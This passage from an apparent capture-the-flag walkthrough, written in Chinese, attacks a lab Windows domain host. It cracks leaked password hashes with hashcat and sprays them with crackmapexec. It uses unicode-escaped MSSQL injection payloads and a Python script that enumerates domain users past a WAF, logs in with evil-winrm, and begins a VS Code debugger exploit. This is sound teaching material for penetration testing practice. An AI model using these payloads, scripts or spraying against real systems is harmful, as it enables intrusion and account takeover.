+<p>发现是所有用户的用户名和密码，将用户名和密码保存到文件中，方便后续使用</p>
+<ul>
+<li><code>users</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">sbauer
+</span></span><span class="line"><span class="cl">okent
+</span></span><span class="line"><span class="cl">ckane
+</span></span><span class="line"><span class="cl">kpage
+</span></span><span class="line"><span class="cl">shayna
+</span></span><span class="line"><span class="cl">james
+</span></span><span class="line"><span class="cl">cyork
+</span></span><span class="line"><span class="cl">rmartin
+</span></span><span class="line"><span class="cl">zac
+</span></span><span class="line"><span class="cl">jorden
+</span></span><span class="line"><span class="cl">alyx
+</span></span><span class="line"><span class="cl">ilee
+</span></span><span class="line"><span class="cl">nbourne
+</span></span><span class="line"><span class="cl">zpowers
+</span></span><span class="line"><span class="cl">aldom
+</span></span><span class="line"><span class="cl">minatotw
+</span></span><span class="line"><span class="cl">egre55
+</span></span></code></pre></div><ul>
+<li><code>passwords</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
+</span></span><span class="line"><span class="cl">fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
+</span></span><span class="line"><span class="cl">68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
+</span></span><span class="line"><span class="cl">68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
+</span></span><span class="line"><span class="cl">9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
+</span></span><span class="line"><span class="cl">9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
+</span></span><span class="line"><span class="cl">9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
+</span></span><span class="line"><span class="cl">fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
+</span></span><span class="line"><span class="cl">68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
+</span></span><span class="line"><span class="cl">9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
+</span></span><span class="line"><span class="cl">fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
+</span></span><span class="line"><span class="cl">68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
+</span></span><span class="line"><span class="cl">fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
+</span></span><span class="line"><span class="cl">68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
+</span></span><span class="line"><span class="cl">9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
+</span></span><span class="line"><span class="cl">cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
+</span></span><span class="line"><span class="cl">cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
+</span></span></code></pre></div><p>这时发现大多数密码都是一样的</p>
+<h2 id="hashcat破解密码">
+<a class="header-anchor" href="#hashcat%e7%a0%b4%e8%a7%a3%e5%af%86%e7%a0%81"></a>
+hashcat破解密码
+</h2><p>先利用<code>john</code>尝试破解密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724154238265-1306385108.png" alt="image-20240724154233559"></p>
+<p>发现并没有成功，尝试使用<code>hash-identifier</code>查看数据类型</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724154552885-955828641.png" alt="image-20240724154548438"></p>
+<p>发现长度为384，测试后发现是<code>Keccak-384</code></p>
+<p><code>hashcat -m 17900 passwords /usr/share/wordlists/rockyou.txt --force</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724154759021-1055109536.png" alt="image-20240724154754519"></p>
+<p>最后也是成功破解出三个密码，虽然数据库中有一堆用户，但是只有四个唯一的密码找到与其对应的用户名</p>
+<table>
+  <thead>
+      <tr>
+          <th>用户名</th>
+          <th>密码</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>sbauer, shayna, james, cyork, jorden, aldom</td>
+          <td>password1</td>
+      </tr>
+      <tr>
+          <td>ckane, kpage, zac, ilee, zpowers</td>
+          <td>finance1</td>
+      </tr>
+      <tr>
+          <td>okent, rmartin, alyx, nbourne</td>
+          <td>banking1</td>
+      </tr>
+      <tr>
+          <td>minatotw, egre55</td>
+          <td>未知</td>
+      </tr>
+  </tbody>
+</table>
+<p>发现不知道密码的两个人身份是<code>CEO</code>，将密码重新保存至新的文件<code>passwds</code></p>
+<h2 id="密码喷洒">
+<a class="header-anchor" href="#%e5%af%86%e7%a0%81%e5%96%b7%e6%b4%92"></a>
+密码喷洒
+</h2><p>将提取出来的密码保存下来，尝试使用<code>crackmapexec</code>进行密码喷洒</p>
+<p><code>crackmapexec smb 10.10.10.179 -u users -p passwords</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724161246263-1891197988.png" alt="image-20240724161241655"></p>
+<p>都失败了，只能寻找其他办法了，尝试寻找其他数据库中的信息，然而这些数据库中没有有用的信息</p>
+<h1 id="mssql-注入枚举域用户名">
+<a class="header-anchor" href="#mssql-%e6%b3%a8%e5%85%a5%e6%9e%9a%e4%b8%be%e5%9f%9f%e7%94%a8%e6%88%b7%e5%90%8d"></a>
+MSSQL 注入枚举域用户名
+</h1><h2 id="攻击原理">
+<a class="header-anchor" href="#%e6%94%bb%e5%87%bb%e5%8e%9f%e7%90%86"></a>
+攻击原理
+</h2><blockquote>
+<p>通过网上搜索发现可以使用 RID 蛮力通过 MSSQL 注入来执行Active Directory枚举获取用户名</p>
+<p>攻击原理：</p>
+<ul>
+<li>找出域名</li>
+<li>找出域的SID</li>
+<li>通过迭代一系列 RID 来确定每个对象的名称，从而构建用户、组和计算机 SID</li>
+</ul>
+<p><a href="https://keramas.github.io/2020/03/22/mssql-ad-enumeration.html">参考链接</a></p>
+</blockquote>
+<blockquote>
+<p>SQL Server中有一个函数叫做SUSER_SID()可以用来，它可以返回给定用户的安全标识号（SID），使用它来标识主域管理员的SID。</p>
+<p>利用SQL注入枚举域内用户主要用到两个函数是SUSER_SID和SUSER_SNAME</p>
+<p><a href="https://learn.microsoft.com/en-us/sql/t-sql/functions/suser-sid-transact-sql?view=sql-server-ver16">SUSER_SID()函数说明</a></p>
+<p><a href="https://learn.microsoft.com/en-us/sql/t-sql/functions/suser-sname-transact-sql?view=sql-server-ver16">SUSER_SNAME()函数说明</a></p>
+<p>先使用SUSER_SID函数拿到域的SID，之后使用SUSER_SNAME函数通过之前拿到的SID进行拼接RID进行枚举域用户名，之后在通过拿到的域用户名喷洒之前获得的凭据密码。</p>
+</blockquote>
+<p>从之前<code>sqlmap</code>获取数据部分可以知道，字段数为5，回显位置是4</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724182312718-55166275.png" alt="image-20240724182307833"></p>
+<p>这里借助<code>CyberChef</code>工具的<code>Escape Unicode Characters</code>模块，可以很方便的帮助我们进行编码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724183224966-434528211.png" alt="image-20240724183219833"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724182733745-1169710557.png" alt="image-20240724182729157"></p>
+<p>可以看到，将<code>sqlmap</code>跑出来的<code>Payload</code>经过<code>unicode</code>编码后，利用<code>burpsuite</code>发送仍然有效，数据显示在阿<code>email</code>位置，接下来就可以继续操作了</p>
+<h2 id="获取默认域">
+<a class="header-anchor" href="#%e8%8e%b7%e5%8f%96%e9%bb%98%e8%ae%a4%e5%9f%9f"></a>
+获取默认域
+</h2><p>第一步就是要获取域的名称，利用<code>default_domain()</code>函数获取域名</p>
+<p><code>a ' union select 1,2,3,(select default_domain()),5 --</code></p>
+<p>将<code>payload</code>编码后发送</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724184629285-1312604411.png" alt="image-20240724184624729"></p>
+<p>可以获得域名<code>MEGACORP</code></p>
+<h2 id="获取域的-sid">
+<a class="header-anchor" href="#%e8%8e%b7%e5%8f%96%e5%9f%9f%e7%9a%84-sid"></a>
+获取域的 SID
+</h2><p>知道域名后，可以使用一致的内置账户或组（如：<code>Administrator</code>账户）注入获取<code>SID</code>值，在无类型转换的情况下会返回一个二进制数据，不利于我们读取，所以使用<code>sys.fn_varbintohexstr</code>将其包装起来，使其能够在<code>http</code>中直观地看出数据</p>
+<blockquote>
+<p><code>sys.fn_varbintohexstr</code> 是 Microsoft SQL Server 中的一个系统函数。它用于将二进制数据转换为十六进制字符串表示</p>
+</blockquote>
+<p><code>a ' union select 1,2,3,(select sys.fn_varbintohexstr(SUSER_SID('MEGACORP\Administrator'))),5 --</code></p>
+<p>将<code>payload</code>编码后发送</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724185434633-319141801.png" alt="image-20240724185429811"></p>
+<p>这里就拿到了SID<code>的十六进制：</code>0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000`</p>
+<p>但是我们需要将这个16进制数据转换成<code>SID</code>格式，这里利用<code>python</code>脚本实现</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hex_to_sid</span><span class="p">(</span><span class="n">hex_str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 去掉前缀 &#34;0x&#34; 和可能的空格</span>
+</span></span><span class="line"><span class="cl">    <span class="n">hex_str</span> <span class="o">=</span> <span class="n">hex_str</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;0x&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 将十六进制字符串转换为字节数组</span>
+</span></span><span class="line"><span class="cl">    <span class="n">byte_array</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">hex_str</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 获取第一个字节，它表示版本号</span>
+</span></span><span class="line"><span class="cl">    <span class="n">revision</span> <span class="o">=</span> <span class="n">byte_array</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 第二个字节表示标识符权限值的长度</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sub_authority_count</span> <span class="o">=</span> <span class="n">byte_array</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 接下来是6个字节的标识符权限值</span>
+</span></span><span class="line"><span class="cl">    <span class="n">identifier_authority</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">byte_array</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">8</span><span class="p">],</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;big&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 剩下的字节是子授权值</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sub_authorities</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">sub_authority_count</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sub_authority</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">byte_array</span><span class="p">[</span><span class="mi">8</span> <span class="o">+</span> <span class="n">i</span><span class="o">*</span><span class="mi">4</span><span class="p">:</span> <span class="mi">12</span> <span class="o">+</span> <span class="n">i</span><span class="o">*</span><span class="mi">4</span><span class="p">],</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;little&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sub_authorities</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">sub_authority</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 组装SID字符串</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sid</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;S-</span><span class="si">{</span><span class="n">revision</span><span class="si">}</span><span class="s2">-</span><span class="si">{</span><span class="n">identifier_authority</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">sub_authority</span> <span class="ow">in</span> <span class="n">sub_authorities</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sid</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">&#34;-</span><span class="si">{</span><span class="n">sub_authority</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">sid</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">hex_str</span> <span class="o">=</span> <span class="s2">&#34;0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">sid</span> <span class="o">=</span> <span class="n">hex_to_sid</span><span class="p">(</span><span class="n">hex_str</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;SID: </span><span class="si">{</span><span class="n">sid</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724190101967-1037261460.png" alt="image-20240724190057434"></p>
+<p>最后就获得了<code>SID</code>：<code>S-1-5-21-3167813660-1240564177-918740779-500</code></p>
+<h2 id="枚举用户rid">
+<a class="header-anchor" href="#%e6%9e%9a%e4%b8%be%e7%94%a8%e6%88%b7rid"></a>
+枚举用户RID
+</h2><p>上一步获取了<code>Administertor</code>的<code>SID</code>，可以利用之前提到过的<code>SUSER_SNAME()</code>函数验证一下</p>
+<p><code>a ' union select 1,2,3,(select SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000)),5 --</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724190903604-191476298.png" alt="image-20240724190858542"></p>
+<p>验证没问题，并且知道<code>Administertor</code>的<code>RID</code>是<code>500</code></p>
+<p>接下来就可以通过这个<code>RID</code>的值来爆破其他域用户名，这里使用<code>python</code>脚本来实现，但是要注意不要请求的太快，请求太快会被<code>waf</code>拦截，用<code>sleep</code>函数来达到延时访问的效果</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># SID转16进制</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sid_to_hex</span><span class="p">(</span><span class="n">sid_str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parts</span> <span class="o">=</span> <span class="n">sid_str</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">revision</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">identifier_authority</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sub_authorities</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">part</span><span class="p">)</span> <span class="k">for</span> <span class="n">part</span> <span class="ow">in</span> <span class="n">parts</span><span class="p">[</span><span class="mi">2</span><span class="p">:]]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">hex_bytes</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">([</span><span class="n">revision</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">sub_authorities</span><span class="p">)])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">hex_bytes</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">identifier_authority</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;big&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">sub_authority</span> <span class="ow">in</span> <span class="n">sub_authorities</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">hex_bytes</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">sub_authority</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;little&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;0x&#34;</span> <span class="o">+</span> <span class="n">hex_bytes</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 编码</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">unicode_escape</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="sa">r</span><span class="s2">&#34;\u</span><span class="si">{:04x}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">s</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/json;charset=UTF-8&#39;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://10.10.10.179/api/getColleagues&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">sql</span> <span class="o">=</span> <span class="s2">&#34;a&#39; union select 1,2,3,(select SUSER_SNAME(</span><span class="si">{}</span><span class="s2">)),5 --&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span><span class="mi">10000</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sid</span> <span class="o">=</span> <span class="s2">&#34;S-1-5-21-3167813660-1240564177-918740779-</span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">str</span> <span class="o">=</span> <span class="n">sid_to_hex</span><span class="p">(</span><span class="n">sid</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;{&#34;name&#34;:&#34;&#39;</span><span class="o">+</span><span class="n">unicode_escape</span><span class="p">(</span><span class="n">sql</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">str</span><span class="p">))</span><span class="o">+</span><span class="s1">&#39;&#34;}&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="s1">&#39;email&#39;</span><span class="p">]</span> <span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="s1">&#39;email&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span></code></pre></div><p>运行上述脚本等待一会儿，就可以得到该域内几乎全部的用户名，将用户名保存到文件<code>users.txt</code>中，顺便把<code>MEGACORP\</code>过滤掉</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Administrator
+</span></span><span class="line"><span class="cl">Guest
+</span></span><span class="line"><span class="cl">krbtgt
+</span></span><span class="line"><span class="cl">DefaultAccount
+</span></span><span class="line"><span class="cl">Domain Admins
+</span></span><span class="line"><span class="cl">Domain Users
+</span></span><span class="line"><span class="cl">Domain Guests
+</span></span><span class="line"><span class="cl">Domain Computers
+</span></span><span class="line"><span class="cl">Domain Controllers
+</span></span><span class="line"><span class="cl">Cert Publishers
+</span></span><span class="line"><span class="cl">Schema Admins
+</span></span><span class="line"><span class="cl">Enterprise Admins
+</span></span><span class="line"><span class="cl">Group Policy Creator Owners
+</span></span><span class="line"><span class="cl">Read-only Domain Controllers
+</span></span><span class="line"><span class="cl">Cloneable Domain Controllers
+</span></span><span class="line"><span class="cl">Protected Users
+</span></span><span class="line"><span class="cl">Key Admins
+</span></span><span class="line"><span class="cl">Enterprise Key Admins
+</span></span><span class="line"><span class="cl">RAS and IAS Servers
+</span></span><span class="line"><span class="cl">Allowed RODC Password Replication Group
+</span></span><span class="line"><span class="cl">Denied RODC Password Replication Group
+</span></span><span class="line"><span class="cl">MULTIMASTER$
+</span></span><span class="line"><span class="cl">DnsAdmins
+</span></span><span class="line"><span class="cl">DnsUpdateProxy
+</span></span><span class="line"><span class="cl">svc-nas
+</span></span><span class="line"><span class="cl">Privileged IT Accounts
+</span></span><span class="line"><span class="cl">tushikikatomo
+</span></span><span class="line"><span class="cl">andrew
+</span></span><span class="line"><span class="cl">lana
+</span></span><span class="line"><span class="cl">alice
+</span></span><span class="line"><span class="cl">test
+</span></span><span class="line"><span class="cl">dai
+</span></span><span class="line"><span class="cl">svc-sql
+</span></span><span class="line"><span class="cl">SQLServer2005SQLBrowserUser$MULTIMASTER
+</span></span><span class="line"><span class="cl">sbauer
+</span></span><span class="line"><span class="cl">okent
+</span></span><span class="line"><span class="cl">ckane
+</span></span><span class="line"><span class="cl">kpage
+</span></span><span class="line"><span class="cl">james
+</span></span><span class="line"><span class="cl">cyork
+</span></span><span class="line"><span class="cl">rmartin
+</span></span><span class="line"><span class="cl">zac
+</span></span><span class="line"><span class="cl">jorden
+</span></span><span class="line"><span class="cl">alyx
+</span></span><span class="line"><span class="cl">ilee
+</span></span><span class="line"><span class="cl">nbourne
+</span></span><span class="line"><span class="cl">zpowers
+</span></span><span class="line"><span class="cl">aldom
+</span></span><span class="line"><span class="cl">jsmmons
+</span></span><span class="line"><span class="cl">pmartin
+</span></span><span class="line"><span class="cl">Developers
+</span></span></code></pre></div><h2 id="二次密码喷洒登录tushikikatomo">
+<a class="header-anchor" href="#%e4%ba%8c%e6%ac%a1%e5%af%86%e7%a0%81%e5%96%b7%e6%b4%92%e7%99%bb%e5%bd%95tushikikatomo"></a>
+二次密码喷洒登录tushikikatomo
+</h2><p>用刚得到的用户名以及密码进行密码喷洒</p>
+<p><code>crackmapexec smb 10.10.10.179 -u users.txt -p passwds</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724212704923-13932621.png" alt="image-20240724212700281"></p>
+<p>最后也是在漫长的等待中，找到了正确的用户名和密码，在查看一下能否<code>winrm</code>登录</p>
+<p><code>crackmapexec winrm 10.10.10.179 -u tushikikatomo -p finance1</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724212837921-732608447.png" alt="image-20240724212832989"></p>
+<p>可以登录，直接登录该用户</p>
+<p><code>evil-winrm -i 10.10.10.179 -u tushikikatomo -p finance1</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724213111085-1525432495.png" alt="image-20240724213106549"></p>
+<p>登陆成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724213155442-1793569265.png" alt="image-20240724213150692"></p>
+<p>最后在<code>Desktop</code>目录下找到<code>user.txt</code></p>
+<h1 id="横向移动">
+<a class="header-anchor" href="#%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8"></a>
+横向移动
+</h1><h2 id="bloodhound信息搜集">
+<a class="header-anchor" href="#bloodhound%e4%bf%a1%e6%81%af%e6%90%9c%e9%9b%86"></a>
+bloodhound信息搜集
+</h2><p>先使用<code>bloodhound</code>进行信息搜集，看看能不能有有价值的信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240725102932070-1881559902.png" alt="image-20240725102923819"></p>
+<p>发现还有很多其他用户，但是没找到什么其他信息</p>
+<p>还是去翻翻文件夹吧</p>
+<p>也是翻了好久，最后在<code>Program Files</code>文件夹中，发现一堆应用</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240725111221575-575415943.png" alt="image-20240725111210668"></p>
+<p>再看下进程看看那些应用在运行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240725112503342-1413852341.png" alt="image-20240725112455699"></p>
+<p>发现在最上面运行着一堆<code>Code</code>进程，猜测跟<code>VSCode</code>应用有关，确认一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240726103348474-1758824233.png" alt="image-20240726103345887"></p>
+<p>发现确实是该应用，看看该应用的版本</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240726104232227-713737.png" alt="image-20240726104229382"></p>
+<p>在<code>C:\Program Files\Microsoft VS Code\resources\app</code>目录下找到<code>package.json</code></p>
+<p>在网上搜索该版本是否有漏洞，发现如下结果</p>
+<ul>
+<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1414">CVE-2019-1414</a></li>
+</ul>
+<h2 id="cve-2019-1414登录cyork">
+<a class="header-anchor" href="#cve-2019-1414%e7%99%bb%e5%bd%95cyork"></a>
+CVE-2019-1414登录cyork
+</h2><blockquote>
+<p>当 Visual Studio Code 向本地计算机的用户公开调试侦听器时，它会存在特权提升漏洞。成功利用此漏洞的本地攻击者可以注入任意代码以在当前用户的上下文中运行。如果当前用户使用管理用户权限登录，则攻击者可以控制受影响的系统。
+<a href="https://iwantmore.pizza/posts/cve-2019-1414.html">详细利用方法</a></p>
+</blockquote>
+<p>使用工具<a href="https://github.com/taviso/cefdebug">cefdebug</a>可以利用这个漏洞</p>
+<p>先将工具下载到本地，再将<code>cefdebug.exe</code>传到机器上</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729093323214-1165219866.png" alt="image-20240729093308415"></p>
+<p>运行该文件</p>
